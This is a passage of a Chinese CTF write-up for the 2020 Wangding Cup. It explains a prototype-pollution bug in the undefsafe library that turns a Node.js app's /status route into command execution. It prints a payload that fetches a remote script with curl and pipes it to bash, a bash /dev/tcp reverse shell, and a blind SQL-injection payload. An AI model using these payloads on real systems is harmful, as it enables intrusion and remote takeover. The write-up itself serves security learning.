+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">stack</span><span class="p">);</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Something broke!&#39;</span><span class="p">);</span>
+<span class="p">});</span>
+
+
+<span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">8080</span><span class="p">;</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Example app listening at http://localhost:</span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>通过上面参考链接可知undefsafe包，版本&lt;2.0.3有原型链污染漏洞</p>
+<p>谷歌一下undefsafe，它的基本功能是取出字典中的对象或者更新字典中的对象：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">object</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="nx">a</span><span class="o">:</span> <span class="p">{</span>
+    <span class="nx">b</span><span class="o">:</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="c1">// modified object
+</span><span class="c1"></span><span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">undefsafe</span><span class="p">(</span><span class="nx">object</span><span class="p">,</span> <span class="s1">&#39;a.b.0&#39;</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">object</span><span class="p">);</span> <span class="c1">// { a: { b: [10, 2, 3] } }
+</span><span class="c1">//这里可以看见1被替换成了10
+</span></code></pre></td></tr></table>
+</div>
+</div><p>参考：<a href="https://github.com/remy/undefsafe"><a href="https://github.com/remy/undefsafe">https://github.com/remy/undefsafe</a></a></p>
+<p>审计代码发现由于<code>/status</code>路由下有命令执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/status&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">commands</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&#34;script-1&#34;</span><span class="o">:</span> <span class="s2">&#34;uptime&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;script-2&#34;</span><span class="o">:</span> <span class="s2">&#34;free -m&#34;</span>
+        <span class="p">};</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">index</span> <span class="k">in</span> <span class="nx">commands</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">exec</span><span class="p">(</span><span class="nx">commands</span><span class="p">[</span><span class="nx">index</span><span class="p">],</span> <span class="p">{</span><span class="nx">shell</span><span class="o">:</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">},</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`stdout: </span><span class="si">${</span><span class="nx">stdout</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+            <span class="p">});</span>
+        <span class="p">}</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;OK&#39;</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+    <span class="p">})</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>所以可以通过污染commands这个字典，例如令<code>commads.a=whoami</code>，然后访问/status它会遍历执行commands字典中的命令</p>
+<p><code>/edit_note</code>下可以传三个参数，调用<code>edit_note(id, author, raw)</code>函数，然后使用了undefsafe进行字典的修改</p>
+<p>因为undefsafe操作的对象可控，所以我们可以进行原型链污染</p>
+<p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">id=__proto__&amp;amp;author=curl ip/a.txt|bash&amp;amp;raw=123
+//a.txt内容为：
+bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1
+</code></pre></td></tr></table>
+</div>
+</div><p>反弹shell，flag在根目录下</p>
+<h2 id="trace">trace</h2>
+<p>这个是insert注入，好像复现不了了orz</p>
+<p>郁离歌学长的payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">2</span><span class="s1">&#39;^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),&#34;+str(i)+&#34;,1))=&#34;+str(j)+&#34;,pow(9999,100) or sleep(3),pow(9999,100)),&#39;</span><span class="mi">1</span><span class="s1">&#39;)#
+</span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-05-10</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-writeup/" data-title="“网鼎杯”2020 Writeup" data-hashtags="prototype pollution,XXE"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-writeup/" data-hashtag="prototype pollution"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-writeup/" data-title="“网鼎杯”2020 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/prototype-pollution/">prototype pollution</a>,&nbsp;<a href="/tags/xxe/">XXE</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/minilctf2020-writeup/" class="next" rel="next" title="MiniLCTF2020 Writeup">MiniLCTF2020 Writeup<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{"valine":{"appId":"saBpLNPwjiIGzpSf9QvvTLw3-9Nh9j0Va","appKey":"jU0L8JdQYxxwunKTXrmGV194","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"visitor":true}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
